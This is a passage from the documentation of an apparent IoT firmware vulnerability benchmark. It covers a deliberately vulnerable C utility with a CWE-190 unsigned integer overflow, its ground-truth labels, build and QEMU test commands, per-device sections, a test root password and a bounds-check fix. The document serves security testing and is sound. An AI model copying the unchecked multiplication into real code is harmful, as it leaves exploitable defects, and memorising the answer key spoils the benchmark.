the defect. Each invocation prints the fixture notice. This calculation runs
locally in the guest and requires neither HTTP requests nor a crash.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario and exact ground truth

Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Classification: **CWE-190: Integer Overflow or Wraparound**.
Every existing device category has one independent image combining its normal
profile with the sole vulnerability package `cwe190-integer-overflow`. The
local firmware utility estimates the size of a synthetic batch of telemetry
records. Its first command-line argument is the record count. It performs
only numeric conversion, multiplication, comparison and printing; no network,
filesystem access, allocation based on input, data copy, command execution,
configuration change, credential access or elevated privilege is needed.
The utility adds no daemon, boot service, login account, sudo grant or SUID bit.

The source is
[`fixture-batch-size.c`](../meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c).
It uses standard `<stdint.h>` types and `<inttypes.h>` portable conversion and
printing. `parse_record_count()` accepts only a nonempty string of ASCII digits,
converts with `strtoumax(..., 10)`, checks `ERANGE`, full consumption and the
`UINT32_MAX` bound, then assigns the validated value to `uint32_t record_count`.
Empty, signed, whitespace-bearing, hexadecimal, fractional, malformed and
out-of-range values return status 2 without numerical stdout. Decimal leading
zeroes are valid. Missing/extra arguments also return 2. Argument-count checking
short-circuits before accessing a nonexistent `argv[1]`.

These are **conversion bounds**, not multiplication bounds: valid input
`4194304` is accepted by the parser. All computations and decisions for valid
inputs return status 0, including ordinary capacity rejection. The final line
reports acceptance or rejection; exit status alone does not express capacity.

| Stage | Exact source location and operation |
| --- | --- |
| External numeric source | `main`, line 46: `argv[1]` passed to `parse_record_count` |
| Format and conversion validation | `parse_record_count`, lines 9–31; `strtoumax` at line 24; range test at line 25; validated assignment at line 28 |
| Fixed operands | Lines 41–42: `uint32_t record_size = 1024`, `uint32_t max_capacity = 4096` (both const) |
| Vulnerable arithmetic | `calculate_total`, line 35: `return record_count * record_size;` |
| Intentionally missing protection | Line 34 documents absent multiplication-bound validation; no sufficient check between parsed input and multiplication |
| Fixed-width destination | Line 51: `uint32_t total_size = calculate_total(record_count, record_size);` |
| Observable result | Lines 52–55 print count, size, stored total and capacity |
| Incorrect downstream logic | Line 56: `if (total_size <= max_capacity)`; lines 57–59 print the selected decision |

The multiplication uses 32-bit unsigned operands on all supported targets;
`calculate_total` returns `uint32_t`. No wider multiplication intermediate,
checked-arithmetic builtin, saturation, operation-bound input cap or overflow
rejection protects this path. The largest representable value is
**4294967295 (`UINT32_MAX`)**; results wrap modulo **4294967296 (2^32)**.
There is no dependency on undefined signed-integer overflow.

| Input | Exact mathematical total | Stored uint32_t total | Observed decision | Correct capacity decision |
| --- | --- | --- | --- | --- |
| `2` | 2048 | 2048 | accepted | accepted |
| `4` | 4096 | 4096 | accepted | accepted |
| `5` | 5120 | 5120 | exceeds capacity | exceeds capacity |
| `4194303` | 4294966272 | 4294966272 | exceeds capacity | exceeds capacity |
| `4194304` | 4294967296 | 0 | **accepted** | **exceeds capacity** |
| `4194305` | 4294968320 | 1024 | **accepted** | **exceeds capacity** |
| `4294967295` | 4398046510080 | 4294966272 | exceeds capacity | exceeds capacity |

Representative vulnerable flow, shared by every device:

`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → **incorrectly accepted**.

Expected static-analysis data flow: `argv[1]` → validated decimal conversion
→ `uint32_t record_count` → `calculate_total(record_count, record_size)`
→ unchecked 32-bit multiplication → `uint32_t total_size` → comparison with
4096 → printed synthetic decision. Expected finding: **CWE-190**, externally
controlled arithmetic can exceed the fixed-width destination without overflow
validation, and subsequent application logic consumes the incorrect result.
`ground-truth.json` records the exact lines, operands, label and witness.
The metadata labels are annotations; the arithmetic and its consumer must be
analyzed to establish the finding.

### Firmware components and compilation

| Artifact | Repository or installed location |
| --- | --- |
| Shared package recipe | `meta-iotbench/recipes-vulns/cwe190-integer-overflow/cwe190-integer-overflow_1.0.bb` |
| Actual native C source | `meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c` |
| Native executable, root:root 0755 | `/usr/bin/fixture-batch-size` |
| Identical installed source, root:root 0644 | `/usr/share/iotbench/integer-overflow/fixture-batch-size.c` |
| Matching annotation and local assets, root:root 0644 | `ground-truth.json`, `NOTICE`, `LICENSE`, `test-guest.sh` in that same data directory |
| Image metadata include | `meta-iotbench/recipes-images/iotbench-integer-overflow.inc` |
| Host validation runner | `scripts/test-integer-overflow.py` |

The recipe uses local `file://` sources, `S = "${UNPACKDIR}"`, `virtual/libc`,
and the normal `${CC} ${CPPFLAGS} ${CFLAGS} ${LDFLAGS}` cross compiler and flags.
It appends `-std=c99 -Wall -Wextra -Werror -O0 -g -fno-inline -fno-lto` to retain
the parser, arithmetic function, 32-bit multiplication and consumer for firmware
analysis. Package stripping is inhibited; normal Yocto debug-package handling
still applies. Only this buffer-free helper undefines `_FORTIFY_SOURCE`, matching
the existing native fixture convention because glibc fortify requires optimization
and otherwise fails the intentional `-O0 -Werror` build. Other Yocto hardening
flags remain. There is no sanitizer dependency in the firmware binary.

The helper uses only libc. BusyBox and `util-linux-setpriv` support guest tests;
the latter is ordinary non-SUID test infrastructure, never called by the utility.
No synthetic data file is needed: record size and capacity are fixed constants.
Device identity and peripheral configuration continue to come from each profile.
The image include verifies root-owned 0755 executable permissions and appends
NOTICE to `/etc/motd`. NOTICE, the image description and each utility invocation's
stderr display the exact warning above.

Recipes are architecture-independent and use the existing `YOCTO_MACHINE`
selector: default `qemuarm64`, or `qemuarm`, `qemux86-64`, `qemux86`, `qemumips`.
No architecture, toolchain or unrelated platform component is added. A source
shared by eleven images follows the existing device × vulnerability architecture;
each image contains its own installed native executable and corresponding source.
Exports contain the compressed ext4 rootfs and kernel in each firmware directory.
Build products under `deploy-images/` remain ignored by Git, following repository
policy; the package/image recipes and matching sources are the reproducible inputs.

### Local build and deterministic verification

Run host commands from the repository root. Parse the layer and resolve a graph:

~~~bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe190-integer-overflow'
~~~

Build and export all eleven fixtures with the existing exporter:

~~~bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe190-integer-overflow.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

`scripts/build-all.sh` discovers these targets automatically. Use the same
`YOCTO_MACHINE` at build and boot time when selecting another supported target.

A separate local host build verifies exact numerical output and decisions using
Python's unlimited-precision arithmetic as the independent oracle. It covers
74 counts (ten chosen boundary/witness cases plus 64 deterministically seeded
counts), decimal leading-zero aliases, malformed strings, conversion overflow,
`UINT32_MAX`, and argument-count errors. It checks status and warning separately.

~~~bash
python3 scripts/test-integer-overflow.py --local
python3 scripts/test-integer-overflow.py --local --sanitize
~~~

`--cc` selects the host compiler. `--sanitize` additionally requires Clang
(`--clang` selects it), builds a temporary executable with
`-fsanitize=unsigned-integer-overflow -fno-sanitize-recover=unsigned-integer-overflow`,
and requires the specific **unsigned integer overflow: 4194304 * 1024** diagnostic
at source line 35. Input `2` must be clean. A separate temporary corrected control
adds the pre-multiplication bound check: normal input remains correct and the
overflow witness / maximum input return 2 with no diagnostic. Neither the
installed source nor the firmware binary is modified by these diagnostic tests.
Although the instrumentation is part of Clang's UBSan runtime, unsigned wraparound
is defined C behavior; its diagnostic does not imply signed undefined behavior.
These tests demonstrate a concrete arithmetic defect, not a generic failure.

Offline firmware inspection never mounts or executes the image:

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/router-cwe190-integer-overflow/qemuarm64/iotbench-router-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The `debugfs` path is for the aarch64 **builder host**; use the `x86_64` counterpart
on that host architecture, or `--debugfs debugfs` when on PATH. `--machine` selects
the expected target ELF class/endianness/machine; `--objdump` selects a matching
cross-objdump for other targets. The verifier checks parser and arithmetic calls
from native `main`, actual 32-bit multiplication in `calculate_total`, preserved
symbols, decision strings, lack of sanitizer instrumentation, exact installed
source/assets, device identity/peripherals, ordinary modes and the login warning.
It prints the helper SHA-256. Disassembly checks corroborate preservation of the
compiled flow; they are not an independent binary-only CWE-190 analyzer.

For manual testing, boot the selected firmware and use the existing guest serial
login `root` / `routeradmin`, then run **inside the guest**:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
setpriv --reuid=65534 --regid=65534 --clear-groups fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh router
~~~

Normal stdout is:

~~~text
record_count = 2
record_size = 1024
total_size = 2048
max_capacity = 4096
Synthetic batch accepted
~~~

Overflow stdout is:

~~~text
record_count = 4194304
record_size = 1024
total_size = 0
max_capacity = 4096
Synthetic batch accepted
~~~

Both commands return 0 with the warning on stderr. `fixture-batch-size 5`
returns 0 but reports `total_size = 5120` and `Synthetic batch exceeds capacity`.
The guest test checks six assertion groups: native installation/profile/modes;
normal arithmetic and decimal aliases; repeated exact overflow plus the incorrect
decision; arithmetic/capacity boundaries; format/range/count rejections; and
non-root execution. Every utility invocation runs as UID/GID 65534 with cleared
groups. It performs no file mutation or host access. Expected: six `PASS` lines,
exit 0. These bounded synthetic invocations terminate normally without a crash.

For automatic disposable QEMU boots, separately from manually running guests:

~~~bash
python3 scripts/test-integer-overflow.py --device router
python3 scripts/test-integer-overflow.py --all
# Optional Apple Silicon acceleration and unused existing service ports:
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-integer-overflow.py --all
~~~

The host runner uses the existing serial-console/snapshot harness, runs one
image at a time, checks all six groups and status, closes QEMU in `finally`,
and saves `validation-console.log` beside the image. `--timeout` bounds each
console step. Profile service forwards are host-loopback-only; the calculator
itself does not use networking. Host QEMU and `zstd` are prerequisites.

### Safe remediation and distinctions

For a separate corrected variant, validate the operation's bounds before
multiplication and allow downstream logic to consume only a validated result:

~~~c
if (record_size != 0 && record_count > UINT32_MAX / record_size) {
    /* Reject an unrepresentable total before computing it. */
    return 2;
}
uint32_t total_size = record_count * record_size;
~~~

Appropriate checked-arithmetic functions are another option. A wider type is
sufficient for this calculation if multiplication is performed in that wider
type (for example `uint64_t`), the full result is validated and comparisons use
it without truncating it back to 32 bits. Merely assigning an already overflowed
32-bit product to a wider destination is insufficient. Keep robust parsing and
ordinary permissions. The corrected variant must preserve `2` → 2048, handle
capacity rejection correctly, and reject `4194304` or compare its full mathematical
total 4294967296 with capacity. The known-positive wraparound test must then fail.
These remediations are documented and used only in a temporary test control;
the intentionally vulnerable firmware path does not implement them.

These fixtures differ from generic Java/JAR applications and integer overflow
in unrelated apps: the input-to-arithmetic flow is in a real native C utility
built by Yocto and installed in each existing device firmware. They differ from
generic native C binaries, fixed-arithmetic programs and calculations that stay
within range: external numeric input reaches an actual 32-bit operation with a
reachable overflowing value and an observable incorrect result/decision. Numeric
input alone, arithmetic alone, a large representable value, or an unused label
is insufficient. Programs that correctly check arithmetic bounds do not satisfy
this ground truth.

They differ from integer underflow and signed conversion issues: input conversion
is checked, values are nonnegative, there is no subtraction, and the defect is
unsigned multiplication exceeding `UINT32_MAX`. They differ from buffer overflow,
heap/stack corruption, out-of-bounds access, NULL dereference and use-after-free:
the result controls no allocation, copy, pointer offset or index, and the program
has no dynamic allocation or free. They differ from command injection, SQL
Injection, Path Traversal and arbitrary command execution: the utility accepts
no commands, SQL or paths and invokes no process, database or file API. They
differ from generic application crashes: both witness inputs terminate normally;
the evidence is exact wraparound and a wrong simulated capacity decision.
The sole intended weakness is **CWE-190**.

The required relationship is **C binary input + input-dependent arithmetic +
fixed-width integer type + potential arithmetic overflow + missing overflow
validation + observable incorrect result**. Its harmless local consequence is
numerical misreporting and incorrect synthetic acceptance, without a secondary
memory-safety or privilege weakness.

### Completed validation

On 2026-10-16, all eleven `qemuarm64` fixtures built and exported successfully
with the pinned Yocto builder after clean BitBake layer parsing and a router
dependency dry run. The helper compiled with `-Wall -Wextra -Werror` and the
normal target toolchain. Every manifest contains the correct `device-<device>`,
`iotbench-sim`, and exactly one vulnerability package, `cwe190-integer-overflow`.

Host C builds passed on both macOS (Clang) and Linux in the existing builder
(GCC): each verified 74 exact numerical/result-decision cases, valid decimal
aliases, malformed/range/argument-count errors and deterministic exits.
The separate Clang unsigned-overflow diagnostic identified the exact multiplication
at line 35: `4194304 * 1024` cannot be represented by `uint32_t`. Normal input
and the temporary bounds-checked control had no such diagnostic. The firmware
source and binary retain their intentionally unchecked arithmetic.

Offline `debugfs` inspection passed for every exported compressed ext4 image:
aarch64 native ELF, calls from `main` to the input parser and arithmetic function,
actual **`mul w0, w1, w0`** 32-bit multiplication in `calculate_total`, both
decision strings, exact installed C source/assets/ground truth, ordinary root-owned
0755 helper and 0644 assets, correct device identity/peripherals, and required
NOTICE/login warning. Every image contains the same helper, SHA-256
`657d3f36f88ecd866bc07a59626f47176312b3ca5fa9b690bf48094be3942367`.

All eleven images booted as disposable QEMU snapshots with HVF/host CPU and
passed **six guest assertion groups each, 66 groups total**. Input `2` returned
2048 and accepted; `4194304` returned 0 and was incorrectly accepted, repeatedly.
The boundary and parsing tests also passed. All utility invocations ran as
UID/GID 65534 with cleared groups and ordinary permissions. Valid calculations
terminated with status 0, malformed input with status 2; no generic failure or
crash was used as overflow evidence. Tests used only the local serial console;
existing profile host-loopback ports were HTTP 18080, MQTT 21883 and Modbus 11502.
The calculator itself uses no network, unsafe memory operation or file access.

The [local validation report](../deploy-images/cwe190-validation/report.txt)
lists all generated repository files, each image's build/offline/runtime results,
all 66 guest assertion groups and SHA-256 checksums of sources, images, kernels,
manifests and logs. Shared logs are under `deploy-images/cwe190-validation/`.
Every device export contains `build.log`, `rootfs.manifest`,
`validation-offline.log`, `validation-runtime.log` and `validation-console.log`.

The existing `qemuarm`, `qemux86-64`, `qemux86` and `qemumips` targets were
**not built or boot-tested** in this run. Their recipes use the existing toolchain
selector without architecture-specific changes; no newly unsupported architecture
was identified. No independent binary-only CWE analyzer was run. The static
finding is expected ground truth supported by the source flow, actual native
multiplication, exact numerical behavior and separate unsigned-overflow diagnostic.

### Integer Overflow — doorlock

Simulated device category: **access-control door lock**, reusing
`meta-iotbench/recipes-devices/doorlock/`. Firmware directory:
`deploy-images/doorlock-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-doorlock-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-doorlock-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of lock telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=doorlock-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=doorlock-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh doorlock
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device doorlock
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/doorlock-cwe190-integer-overflow/qemuarm64/iotbench-doorlock-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/doorlock-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — envsensor

Simulated device category: **environmental sensor**, reusing
`meta-iotbench/recipes-devices/envsensor/`. Firmware directory:
`deploy-images/envsensor-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-envsensor-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-envsensor-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of environmental telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=envsensor-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=envsensor-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh envsensor
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device envsensor
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/envsensor-cwe190-integer-overflow/qemuarm64/iotbench-envsensor-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/envsensor-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — healthmonitor

Simulated device category: **health monitor**, reusing
`meta-iotbench/recipes-devices/healthmonitor/`. Firmware directory:
`deploy-images/healthmonitor-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-healthmonitor-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-healthmonitor-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic health telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh healthmonitor
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device healthmonitor
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/healthmonitor-cwe190-integer-overflow/qemuarm64/iotbench-healthmonitor-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/healthmonitor-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — ipcamera

Simulated device category: **surveillance IP camera**, reusing
`meta-iotbench/recipes-devices/ipcamera/`. Firmware directory:
`deploy-images/ipcamera-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-ipcamera-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-ipcamera-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic snapshot metadata records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=ipcamera-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh ipcamera
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device ipcamera
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/ipcamera-cwe190-integer-overflow/qemuarm64/iotbench-ipcamera-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/ipcamera-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
